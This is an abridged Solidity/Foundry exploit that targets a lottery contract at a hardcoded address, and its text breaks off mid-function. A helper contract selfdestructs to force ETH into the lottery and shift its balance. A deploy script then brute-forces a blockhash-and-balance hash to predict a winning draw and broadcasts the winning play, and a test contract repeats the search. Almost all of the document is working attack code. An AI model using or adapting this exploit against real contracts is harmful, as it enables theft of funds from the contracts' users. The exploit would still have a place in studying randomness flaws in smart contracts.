...
contract D {
    ...
    function kill() payable external {
        ...
        selfdestruct(payable(0x13226329416B07d8dA3c7A50beCd0303cD13F174));
    }
...
contract Guesser {
    ...
    function go(uint256 blocknumber, uint256 amount) public {
        // require(blocknumber == block.number, "");
        Lottery lottery = Lottery(0x13226329416B07d8dA3c7A50beCd0303cD13F174);
        // uint256 lbb = address(lottery).balance;
        D d = new D();
        payable(address(d)).transfer(amount);
        d.kill();
        // emit log_uint(address(lottery).balance - lbb);
        // cheats.startPrank(0x0009A0C1903b72A652A0266FC50FE3364e218aAb);
        lottery.play{value: 0.01 ether}();
...
contract Deployer is Script {
    ...
    function run() external {
        ...
        uint256 b = address(lottery).balance;

        for (uint i = 5; i < 25; i++) {
            // cheats.roll(block.number + 1);
            for (uint j = 0.01 ether; j < 0.2 ether; j++) {
                bytes32 abc = keccak256(
                    abi.encode(
                        blockhash((block.number+i) - (block.number % 200)),
                        address(lottery).balance + j
                    )
                );

                if ((uint256(abc) % 10000) == 0) {
                    // emit log_string("aaaaaaaaaa");
                    // emit log_named_uint("block", block.number+i);
                    // emit log_named_uint("wei", j - 0.01 ether);
                    ...
                    payable(address(guesser)).transfer(0.01 ether + j);
                    vm.stopBroadcast();
                    vm.startBroadcast();

                    guesser.go(block.number + i, j - 0.01 ether);
                    vm.stopBroadcast();
                    break;
                }
            }
...
contract Test is DSTest {
    ...
    function testA() public {
        ...
        for (uint i = 0; i < 25; i++) {
            ...
            for (uint j = 0.01 ether; j < 0.2 ether; j++) {
                bytes32 abc = keccak256(
                    abi.encode(rndSource(), address(lottery).balance + j)
                );
                if ((uint256(abc) % 10000) == 0) {
                    // emit log_string("aaaaaaaaaa");
    ...
    function rndSource() internal view returns (bytes32) {
